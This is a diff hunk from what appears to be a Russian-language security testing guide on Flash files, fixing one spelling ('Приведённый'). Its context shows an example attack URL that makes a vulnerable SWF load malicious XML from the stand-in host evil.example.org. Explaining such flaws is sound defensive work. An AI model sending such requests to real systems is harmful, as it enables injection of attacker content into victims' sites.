@@ -144,7 +144,7 @@ movieClip 328 __Packages.Locale {
     };
 ```
 
-Приведенный выше код может быть атакован запросом:
+Приведённый выше код может быть атакован запросом:
 
 `http://victim/file.swf?language=http://evil.example.org/malicious.xml?`
 
